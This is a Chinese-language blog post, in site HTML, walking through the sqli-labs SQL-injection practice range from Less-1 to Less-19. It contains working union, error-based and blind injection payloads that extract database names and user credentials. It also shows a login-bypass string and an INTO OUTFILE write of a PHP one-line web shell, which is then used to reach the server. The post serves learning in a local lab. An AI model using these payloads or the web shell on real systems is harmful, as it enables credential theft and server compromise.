@@ -1,0 +1,291 @@
+<!DOCTYPE html><html lang="en" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>SQL靶场 | lu1ux's blog</title><meta name="author" content="lu1ux"><meta name="copyright" content="lu1ux"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="SQL靶场part-1 union联合注入LESS-1通过?id&#x3D;2-1 显示的是 ?id&#x3D;2的界面确定是字符型注入 通过?id&#x3D;2’时页面报错判断 闭合方式为单引号闭合 利用 group by 二分法确定页面数据列数量为3  令id&#x3D;0,使其不显示第一行的内容  观察回显位,发现2和3可以正常显示出来 将3改为database() 得到数据库名称secur">
+<meta property="og:type" content="article">
+<meta property="og:title" content="SQL靶场">
+<meta property="og:url" content="http://example.com/2025/11/25/SQL%E9%9D%B6%E5%9C%BA/index.html">
+<meta property="og:site_name" content="lu1ux&#39;s blog">
+<meta property="og:description" content="SQL靶场part-1 union联合注入LESS-1通过?id&#x3D;2-1 显示的是 ?id&#x3D;2的界面确定是字符型注入 通过?id&#x3D;2’时页面报错判断 闭合方式为单引号闭合 利用 group by 二分法确定页面数据列数量为3  令id&#x3D;0,使其不显示第一行的内容  观察回显位,发现2和3可以正常显示出来 将3改为database() 得到数据库名称secur">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="http://example.com/img/23.jpg">
+<meta property="article:published_time" content="2025-11-25T13:28:59.000Z">
+<meta property="article:modified_time" content="2025-11-25T13:32:49.088Z">
+<meta property="article:author" content="lu1ux">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/img/23.jpg"><link rel="shortcut icon" href="/img/favicon.png"><link rel="canonical" href="http://example.com/2025/11/25/SQL%E9%9D%B6%E5%9C%BA/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css?v=4.13.0"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.5.1/css/all.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui@5.0.33/dist/fancybox/fancybox.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = {
+  root: '/',
+  algolia: undefined,
+  localSearch: undefined,
+  translate: undefined,
+  noticeOutdate: undefined,
+  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
+  copy: {
+    success: 'Copy Successful',
+    error: 'Copy Error',
+    noSupport: 'Browser Not Supported'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  dateSuffix: {
+    just: 'Just now',
+    min: 'minutes ago',
+    hour: 'hours ago',
+    day: 'days ago',
+    month: 'months ago'
+  },
+  copyright: undefined,
+  lightbox: 'fancybox',
+  Snackbar: undefined,
+  infinitegrid: {
+    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid@4.11.1/dist/infinitegrid.min.js',
+    buttonText: 'Load More'
+  },
+  isPhotoFigcaption: false,
+  islazyload: false,
+  isAnchor: false,
+  percent: {
+    toc: true,
+    rightside: false,
+  },
+  autoDarkmode: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: 'SQL靶场',
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: true,
+  postUpdate: '2025-11-25 21:32:49'
+}</script><script>(win=>{
+      win.saveToLocal = {
+        set: (key, value, ttl) => {
+          if (ttl === 0) return
+          const now = Date.now()
+          const expiry = now + ttl * 86400000
+          const item = {
+            value,
+            expiry
+          }
+          localStorage.setItem(key, JSON.stringify(item))
+        },
+      
+        get: key => {
+          const itemStr = localStorage.getItem(key)
+      
+          if (!itemStr) {
+            return undefined
+          }
+          const item = JSON.parse(itemStr)
+          const now = Date.now()
+      
+          if (now > item.expiry) {
+            localStorage.removeItem(key)
+            return undefined
+          }
+          return item.value
+        }
+      }
+    
+      win.getScript = (url, attr = {}) => new Promise((resolve, reject) => {
+        const script = document.createElement('script')
+        script.src = url
+        script.async = true
+        script.onerror = reject
+        script.onload = script.onreadystatechange = function() {
+          const loadState = this.readyState
+          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+          script.onload = script.onreadystatechange = null
+          resolve()
+        }
+
+        Object.keys(attr).forEach(key => {
+          script.setAttribute(key, attr[key])
+        })
+
+        document.head.appendChild(script)
+      })
+    
+      win.getCSS = (url, id = false) => new Promise((resolve, reject) => {
+        const link = document.createElement('link')
+        link.rel = 'stylesheet'
+        link.href = url
+        if (id) link.id = id
+        link.onerror = reject
+        link.onload = link.onreadystatechange = function() {
+          const loadState = this.readyState
+          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+          link.onload = link.onreadystatechange = null
+          resolve()
+        }
+        document.head.appendChild(link)
+      })
+    
+      win.activateDarkMode = () => {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      win.activateLightMode = () => {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+      const t = saveToLocal.get('theme')
+    
+        if (t === 'dark') activateDarkMode()
+        else if (t === 'light') activateLightMode()
+      
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        if (asideStatus === 'hide') {
+          document.documentElement.classList.add('hide-aside')
+        } else {
+          document.documentElement.classList.remove('hide-aside')
+        }
+      }
+    
+      const detectApple = () => {
+        if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
+          document.documentElement.classList.add('apple')
+        }
+      }
+      detectApple()
+    })(window)</script><link rel="stylesheet" href="//at.alicdn.com/t/c/font_4066449_d5kq6u6u9dj.css"><link rel="stylesheet" href="/css/mine.css"><meta name="generator" content="Hexo 8.1.1"></head><body><div id="loading-box"><div class="loading-left-bg"></div><div class="loading-right-bg"></div><div class="spinner-box"><div class="configure-border-1"><div class="configure-core"></div></div><div class="configure-border-2"><div class="configure-core"></div></div><div class="loading-word">Loading...</div></div></div><script>(()=>{
+  const $loadingBox = document.getElementById('loading-box')
+  const $body = document.body
+  const preloader = {
+    endLoading: () => {
+      $body.style.overflow = ''
+      $loadingBox.classList.add('loaded')
+    },
+    initLoading: () => {
+      $body.style.overflow = 'hidden'
+      $loadingBox.classList.remove('loaded')
+    }
+  }
+
+  preloader.initLoading()
+  window.addEventListener('load',() => { preloader.endLoading() })
+
+  if (false) {
+    document.addEventListener('pjax:send', () => { preloader.initLoading() })
+    document.addEventListener('pjax:complete', () => { preloader.endLoading() })
+  }
+})()</script><div id="web_bg"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="/img/avator.jpg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">Articles</div><div class="length-num">23</div></a><a href="/tags/"><div class="headline">Tags</div><div class="length-num">0</div></a><a href="/categories/"><div class="headline">Categories</div><div class="length-num">14</div></a></div><hr class="custom-hr"/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw iconfont icon-zhuye"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw iconfont icon-archive-solid"></i><span> 归档</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('/img/23.jpg')"><nav id="nav"><span id="blog-info"><a href="/" title="lu1ux's blog"><span class="site-name">lu1ux's blog</span></a></span><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw iconfont icon-zhuye"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw iconfont icon-archive-solid"></i><span> 归档</span></a></div></div><div id="toggle-menu"><a class="site-page" href="javascript:void(0);"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">SQL靶场</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">Created</span><time class="post-meta-date-created" datetime="2025-11-25T13:28:59.000Z" title="Created 2025-11-25 21:28:59">2025-11-25</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">Updated</span><time class="post-meta-date-updated" datetime="2025-11-25T13:32:49.088Z" title="Updated 2025-11-25 21:32:49">2025-11-25</time></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="SQL靶场"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">Post Views:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h1 id="SQL靶场"><a href="#SQL靶场" class="headerlink" title="SQL靶场"></a>SQL靶场</h1><h2 id="part-1-union联合注入"><a href="#part-1-union联合注入" class="headerlink" title="part-1 union联合注入"></a>part-1 union联合注入</h2><h3 id="LESS-1"><a href="#LESS-1" class="headerlink" title="LESS-1"></a>LESS-1</h3><p>通过?id&#x3D;2-1 显示的是 ?id&#x3D;2的界面确定是字符型注入</p>
+<p>通过?id&#x3D;2’时页面报错判断 闭合方式为单引号闭合</p>
+<p>利用 group by 二分法确定页面数据列数量为3</p>
+<p><img src="https://lu1ux-picture.oss-cn-beijing.aliyuncs.com/picture/20251125213134232.png" alt="image-20241029194727739"></p>
+<p>令id&#x3D;0,使其不显示第一行的内容</p>
+<p><img src="https://lu1ux-picture.oss-cn-beijing.aliyuncs.com/picture/20251125213134240.png" alt="image-20241029194852164"></p>
+<p>观察回显位,发现2和3可以正常显示出来</p>
+<p>将3改为database()</p>
+<p>得到数据库名称security</p>
+<p><img src="https://lu1ux-picture.oss-cn-beijing.aliyuncs.com/picture/20251125213134254.png" alt="image-20241029195011464"></p>
+<p>?id&#x3D;0’ union select 1,group_concat(table_name),3 from information_schema.tables where table_schema &#x3D; ‘security’–+</p>
+<p><img src="https://lu1ux-picture.oss-cn-beijing.aliyuncs.com/picture/20251125213134286.png" alt="image-20241029195531149"></p>
+<p>?id&#x3D;0’ union select 1,group_concat(column_name),3 from information_schema.columns where table_schema &#x3D;database() and table_name&#x3D; ‘users’–+</p>
+<p><img src="https://lu1ux-picture.oss-cn-beijing.aliyuncs.com/picture/20251125213134264.png" alt="image-20241029195913897"></p>
+<p>目标为 username 和 password</p>
+<p>?id&#x3D;0’ union select 1,group_concat(‘~’,username,password),3 from users–+</p>
+<p><img src="https://lu1ux-picture.oss-cn-beijing.aliyuncs.com/picture/20251125213134323.png" alt="image-20241029200222285"></p>
+<h3 id="LESS-2"><a href="#LESS-2" class="headerlink" title="LESS-2"></a>LESS-2</h3><p>基本与LESS-1同理,区别就是LESS-1是字符型注入 , LESS-2是数字型注入</p>
+<h3 id="LESS-3"><a href="#LESS-3" class="headerlink" title="LESS-3"></a>LESS-3</h3><p>判断是字符型注入,且闭合方式是单引号加括号</p>
+<p>union联合注入与LESS-1和LESS-2同理</p>
+<p><img src="https://lu1ux-picture.oss-cn-beijing.aliyuncs.com/picture/20251125213135006.png" alt="image-20241029202410882"></p>
+<p>?id&#x3D;0’) union select 1,group_concat(table_name),3 from information_schema.tables where table_schema &#x3D; ‘security’ –+</p>
+<p>?id&#x3D;0’) union select 1,group_concat(column_name),3 from information_schema.columns where table_schema &#x3D; ‘security’ and table_name &#x3D; ‘users’ –+</p>
+<p>?id&#x3D;0’) union select 1,group_concat(‘~’,username,password),3 from users –+</p>
+<p><img src="https://lu1ux-picture.oss-cn-beijing.aliyuncs.com/picture/20251125213135088.png" alt="image-20241029202849676"></p>
+<h3 id="LESS-4"><a href="#LESS-4" class="headerlink" title="LESS-4"></a>LESS-4</h3><p>判断为字符串注入,闭合方式为双引号加括号</p>
+<p>其余与LESS-1 LESS-2 LESS-3相同</p>
+<h2 id="part-2-报错注入"><a href="#part-2-报错注入" class="headerlink" title="part-2 报错注入"></a>part-2 报错注入</h2><h3 id="LESS-5"><a href="#LESS-5" class="headerlink" title="LESS-5"></a>LESS-5</h3><p>进入题目发现界面只有两种 真和假 , 但页面有回显错误页面,于是使用报错注入</p>
+<p>输入?id&#x3D;1\判断为字符型注入,闭合方式为单引号</p>
+<p><img src="https://lu1ux-picture.oss-cn-beijing.aliyuncs.com/picture/20251125213135403.png" alt="image-20241029204209310"></p>
+<p><img src="https://lu1ux-picture.oss-cn-beijing.aliyuncs.com/picture/20251125213135518.png" alt="image-20241029204219270"></p>
+<p>通过extractvalue()函数报错注入</p>
+<p>?id&#x3D;1’ union select 1,extractvalue(1,concat(‘~’,(select database()))),3 –+</p>
+<p><img src="https://lu1ux-picture.oss-cn-beijing.aliyuncs.com/picture/20251125213135563.png" alt="image-20241029205053225"></p>
+<p>也可以这么报错</p>
+<p>?id&#x3D;1’ and 1&#x3D;extractvalue(1,concat(0x7e,(select database()))) –+</p>
+<p>?id&#x3D;1’ and 1&#x3D;extractvalue(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema &#x3D; database()))) –+</p>
+<p><img src="https://lu1ux-picture.oss-cn-beijing.aliyuncs.com/picture/20251125213135620.png" alt="image-20241029205646446"></p>
+<p>其余部分与前面题同理</p>
+<p>但是发现extractvalue函数报错回显只有32个字符,不能显示完整</p>
+<p><img src="https://lu1ux-picture.oss-cn-beijing.aliyuncs.com/picture/20251125213135689.png" alt="image-20241029205836282"></p>
+<p>使用substring函数解决该问题</p>
+<p>substring(1,2,3)</p>
+<p>1从哪里查询</p>
+<p>2从第几个字符开始</p>
+<p>3数多少个字符</p>
+<p><img src="https://lu1ux-picture.oss-cn-beijing.aliyuncs.com/picture/20251125213136036.png" alt="image-20241029210129078"></p>
+<p>多组拼接达到目的</p>
+<h2 id="LESS-6"><a href="#LESS-6" class="headerlink" title="LESS-6"></a>LESS-6</h2><p>与LESS-5相同,只是闭合方式变为双引号</p>
+<h3 id="LESS-7"><a href="#LESS-7" class="headerlink" title="LESS-7"></a>LESS-7</h3><p>输入id&#x3D;1’ 时候页面报错说明，闭合条件中有 ’</p>
+<p>加入注释符 –+ 后依然报错,则还有其他闭合符 多次尝试后发现闭合符为’))</p>
+<p>file权限和into outfile这个函数。<br>数据库的file权限规定了数据库用户是否有权限向操作系统内写入和读取已存在的权限<br>into outfile命令是filefile系列函数来进行读取敏感文件或者写入webshell</p>
+<p><code>?id=-1&#39;)) union select 1,&quot;&lt;?php @eval($_POST[&#39;lu1ux&#39;]);?&gt;&quot; ,3 into outfile &quot;D:\\phpstudy_pro\\WWW\\lhb.php&quot;--+</code></p>
+<p>通过文件注入一句话木马</p>
+<p><img src="https://lu1ux-picture.oss-cn-beijing.aliyuncs.com/picture/20251125213136406.png" alt="image-20241031004338933"></p>
+<p>使用中国蚁剑连接进入网站后台</p>
+<p><img src="https://lu1ux-picture.oss-cn-beijing.aliyuncs.com/picture/20251125213136502.png" alt="image-20241031004836248"></p>
+<p><img src="https://lu1ux-picture.oss-cn-beijing.aliyuncs.com/picture/20251125213136535.png" alt="image-20241031004843102"></p>
+<p>也可以写文件,1.txt查询所需</p>
+<h2 id="LESS-8"><a href="#LESS-8" class="headerlink" title="LESS-8"></a>LESS-8</h2><p>判断闭合方式是单引号闭合</p>
+<p><img src="https://lu1ux-picture.oss-cn-beijing.aliyuncs.com/picture/20251125213136912.png" alt="image-20241103115457153"></p>
+<p>根据页面分为真假两种,决定使用布尔盲注</p>
+<p>?id&#x3D;1’ and ascii(substring((select database()),1,1))&gt;100 –+</p>
+<p><img src="https://lu1ux-picture.oss-cn-beijing.aliyuncs.com/picture/20251125213137053.png" alt="image-20241103120313018"></p>
+<p>用二分法一步步推断出数字的大小,求出对应的字母,进一步拼成字符串</p>
+<h2 id="LESS-9"><a href="#LESS-9" class="headerlink" title="LESS-9"></a>LESS-9</h2><p>发现输入什么页面显示都为同一种</p>
+<p>于是使用时间盲注</p>
+<p><img src="https://lu1ux-picture.oss-cn-beijing.aliyuncs.com/picture/20251125213137098.png" alt="image-20241104111713590"></p>
+<p>发现单引号闭合时,页面返回有延迟</p>
+<p>判断为单引号闭合</p>
+<p><img src="https://lu1ux-picture.oss-cn-beijing.aliyuncs.com/picture/20251125213137145.png" alt="image-20241104112707259"></p>
+<p>接着用二分法判断库名</p>
+<h2 id="LESS-10"><a href="#LESS-10" class="headerlink" title="LESS-10"></a>LESS-10</h2><p>与LESS-9基本相同,就是闭合方式变为双引号</p>
+<p><img src="https://lu1ux-picture.oss-cn-beijing.aliyuncs.com/picture/20251125213137194.png" alt="image-20241104112844021"></p>
+<h2 id="LESS-11"><a href="#LESS-11" class="headerlink" title="LESS-11"></a>LESS-11</h2><p>不知道为什么hackbar不能用</p>
+<p>使用BP抓包</p>
+<p><img src="https://lu1ux-picture.oss-cn-beijing.aliyuncs.com/picture/20251125213137843.png" alt="image-20241104121236584"></p>
+<p>更改post为</p>
+<p>uname&#x3D;admin’ or 1&#x3D;1 –+&amp;passwd&#x3D;123&amp;submit&#x3D;Submit</p>
+<p>页面正常进入</p>
+<p><img src="https://lu1ux-picture.oss-cn-beijing.aliyuncs.com/picture/20251125213137897.png" alt="image-20241104121302791"></p>
+<p>其余操作同理</p>
+<p>group by 确定列数2</p>
+<p><img src="https://lu1ux-picture.oss-cn-beijing.aliyuncs.com/picture/20251125213138094.png" alt="image-20241104121531360"></p>
+<p>判断回显位 1 , 2 都能显示</p>
+<p><img src="https://lu1ux-picture.oss-cn-beijing.aliyuncs.com/picture/20251125213138190.png" alt="image-20241104122038408"></p>
+<p>查询库名</p>
+<p><img src="https://lu1ux-picture.oss-cn-beijing.aliyuncs.com/picture/20251125213138303.png" alt="image-20241104122414257"></p>
+<p>接着查表名,查列名,与上文同理</p>
+<p>extractvalue报错注入</p>
+<p><img src="https://lu1ux-picture.oss-cn-beijing.aliyuncs.com/picture/20251125213138455.png" alt="image-20241105000842586"></p>
+<h2 id="LESS-12"><a href="#LESS-12" class="headerlink" title="LESS-12"></a>LESS-12</h2><p>闭合方式为”)  , 其余同 LESS-11</p>
+<p><img src="https://lu1ux-picture.oss-cn-beijing.aliyuncs.com/picture/20251125213138589.png" alt="image-20241105001153812"></p>
+<h2 id="LESS-13"><a href="#LESS-13" class="headerlink" title="LESS-13"></a>LESS-13</h2><p>闭合方式为’)</p>
+<p><img src="https://lu1ux-picture.oss-cn-beijing.aliyuncs.com/picture/20251125213138708.png" alt="image-20241105001407992"></p>
+<p>同样报错注入</p>
+<p><img src="https://lu1ux-picture.oss-cn-beijing.aliyuncs.com/picture/20251125213138757.png" alt="image-20241105001527684"></p>
+<h2 id="LESS-14"><a href="#LESS-14" class="headerlink" title="LESS-14"></a>LESS-14</h2><p>闭合方式为双引号闭合</p>
+<p>方法同上</p>
+<h2 id="LESS-15"><a href="#LESS-15" class="headerlink" title="LESS-15"></a>LESS-15</h2><p>怎么输入都没有回显,采用时间盲注</p>
+<p>uname&#x3D;admin’ and sleep(5) –+&amp;passwd&#x3D;admin&amp;submit&#x3D;Submit</p>
+<p>接下来延迟注入爆库,表,列名,值</p>
+<p>uname&#x3D;admin’ and if(length(database())&#x3D;8,sleep(5),1)–+&amp;passwd&#x3D;admin&amp;submit&#x3D;Submit<br>uname&#x3D;admin’ and if(left(database(),1)&#x3D;’s’,sleep(5),1)–+&amp;passwd&#x3D;admin&amp;submit&#x3D;Submit</p>
+<p>uname&#x3D;admin’ and if( left((select table_name from information_schema.tables where table_schema&#x3D;database() limit 1,1),1)&#x3D;’r’ ,sleep(5),1)–+&amp;passwd&#x3D;admin&amp;submit&#x3D;Submit<br>uname&#x3D;admin’ and if(left((select column_name from information_schema.columns where table_name&#x3D;’users’ limit 4,1),8)&#x3D;’password’ ,sleep(5),1)–+&amp;passwd&#x3D;admin&amp;submit&#x3D;Submit</p>
+<p>uname&#x3D;admin’ and if(left((select password from users order by id limit 0,1),4)&#x3D;’dumb’ ,sleep(5),1)–+&amp;passwd&#x3D;admin&amp;submit&#x3D;Submit<br>uname&#x3D;admin’ and if(left((select username from users order by id limit 0,1),4)&#x3D;’dumb’ ,sleep(5),1)–+&amp;passwd&#x3D;admin&amp;submit&#x3D;Submit</p>
+<h2 id="LESS-16"><a href="#LESS-16" class="headerlink" title="LESS-16"></a>LESS-16</h2><p>闭合方式为双引号加括号,其余同LESS-15</p>
+<h2 id="LESS-17"><a href="#LESS-17" class="headerlink" title="LESS-17"></a>LESS-17</h2><p>此处不能对username注入</p>
+<p>我们只需要对passwrod处利用xpath报错注入进行sql注入即可</p>
+<h2 id="LESS-18"><a href="#LESS-18" class="headerlink" title="LESS-18"></a>LESS-18</h2><p>发现回显的是User Agent,</p>
+<p><img src="https://lu1ux-picture.oss-cn-beijing.aliyuncs.com/picture/20251125213138792.png" alt="image-20241105003321606"></p>
+<p>接着使用报错注入</p>
+<p>‘ and updatexml(1,concat(0x3a,(select database()),0x3a),1) and ‘1’&#x3D;’1</p>
+<h2 id="LESS-19"><a href="#LESS-19" class="headerlink" title="LESS-19"></a>LESS-19</h2><p>发现是referer回显</p>
+<p>于是就在referer注入</p>
+<p>其余同</p>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>Author: </span><span class="post-copyright-info"><a href="http://example.com">lu1ux</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>Link: </span><span class="post-copyright-info"><a href="http://example.com/2025/11/25/SQL%E9%9D%B6%E5%9C%BA/">http://example.com/2025/11/25/SQL%E9%9D%B6%E5%9C%BA/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>Copyright Notice: </span><span class="post-copyright-info">All articles in this blog are licensed under <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> unless stating additionally.</span></div></div><div class="tag_share"><div class="post_share"><div class="social-share" data-image="/img/23.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.3/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.3/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/2025/11/25/%E6%97%A0%E5%88%97%E5%90%8D%E6%B3%A8%E5%85%A5-%E4%BA%8C%E6%AC%A1%E6%B3%A8%E5%85%A5/" title="无列名注入&amp;二次注入"><img class="cover" src="/img/21.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="pagination-info"><div class="label">Previous</div><div class="prev_info">无列名注入&amp;二次注入</div></div></a></div><div class="next-post pull-right"><a href="/2025/11/25/SQL%E5%9F%BA%E7%A1%80/" title="SQL基础"><img class="cover" src="/img/20.png" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">Next</div><div class="next_info">SQL基础</div></div></a></div></nav></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="/img/avator.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">lu1ux</div><div class="author-info__description"></div></div><div class="card-info-data site-data is-center"><a href="/archives/"><div class="headline">Articles</div><div class="length-num">23</div></a><a href="/tags/"><div class="headline">Tags</div><div class="length-num">0</div></a><a href="/categories/"><div class="headline">Categories</div><div class="length-num">14</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/lu1ux"><i class="fab fa-github"></i><span>Follow Me</span></a></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>Announcement</span></div><div class="announcement_content">网安小白一枚</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>Contents</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#SQL%E9%9D%B6%E5%9C%BA"><span class="toc-number">1.</span> <span class="toc-text">SQL靶场</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#part-1-union%E8%81%94%E5%90%88%E6%B3%A8%E5%85%A5"><span class="toc-number">1.1.</span> <span class="toc-text">part-1 union联合注入</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#LESS-1"><span class="toc-number">1.1.1.</span> <span class="toc-text">LESS-1</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#LESS-2"><span class="toc-number">1.1.2.</span> <span class="toc-text">LESS-2</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#LESS-3"><span class="toc-number">1.1.3.</span> <span class="toc-text">LESS-3</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#LESS-4"><span class="toc-number">1.1.4.</span> <span class="toc-text">LESS-4</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#part-2-%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5"><span class="toc-number">1.2.</span> <span class="toc-text">part-2 报错注入</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#LESS-5"><span class="toc-number">1.2.1.</span> <span class="toc-text">LESS-5</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#LESS-6"><span class="toc-number">1.3.</span> <span class="toc-text">LESS-6</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#LESS-7"><span class="toc-number">1.3.1.</span> <span class="toc-text">LESS-7</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#LESS-8"><span class="toc-number">1.4.</span> <span class="toc-text">LESS-8</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#LESS-9"><span class="toc-number">1.5.</span> <span class="toc-text">LESS-9</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#LESS-10"><span class="toc-number">1.6.</span> <span class="toc-text">LESS-10</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#LESS-11"><span class="toc-number">1.7.</span> <span class="toc-text">LESS-11</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#LESS-12"><span class="toc-number">1.8.</span> <span class="toc-text">LESS-12</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#LESS-13"><span class="toc-number">1.9.</span> <span class="toc-text">LESS-13</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#LESS-14"><span class="toc-number">1.10.</span> <span class="toc-text">LESS-14</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#LESS-15"><span class="toc-number">1.11.</span> <span class="toc-text">LESS-15</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#LESS-16"><span class="toc-number">1.12.</span> <span class="toc-text">LESS-16</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#LESS-17"><span class="toc-number">1.13.</span> <span class="toc-text">LESS-17</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#LESS-18"><span class="toc-number">1.14.</span> <span class="toc-text">LESS-18</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#LESS-19"><span class="toc-number">1.15.</span> <span class="toc-text">LESS-19</span></a></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>Recent Post</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/2025/11/25/URLDNS/" title="URLDNS"><img src="/img/12.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="URLDNS"/></a><div class="content"><a class="title" href="/2025/11/25/URLDNS/" title="URLDNS">URLDNS</a><time datetime="2025-11-25T14:03:06.000Z" title="Created 2025-11-25 22:03:06">2025-11-25</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2025/11/25/CC%E9%93%BE/" title="CC链"><img src="/img/9.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="CC链"/></a><div class="content"><a class="title" href="/2025/11/25/CC%E9%93%BE/" title="CC链">CC链</a><time datetime="2025-11-25T14:02:54.000Z" title="Created 2025-11-25 22:02:54">2025-11-25</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2025/11/25/%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2/" title="信息泄露"><img src="/img/24.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="信息泄露"/></a><div class="content"><a class="title" href="/2025/11/25/%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2/" title="信息泄露">信息泄露</a><time datetime="2025-11-25T13:50:42.000Z" title="Created 2025-11-25 21:50:42">2025-11-25</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2025/11/25/upload/" title="upload"><img src="/img/3.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="upload"/></a><div class="content"><a class="title" href="/2025/11/25/upload/" title="upload">upload</a><time datetime="2025-11-25T13:44:39.000Z" title="Created 2025-11-25 21:44:39">2025-11-25</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2025/11/25/SSRF/" title="SSRF"><img src="/img/13.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="SSRF"/></a><div class="content"><a class="title" 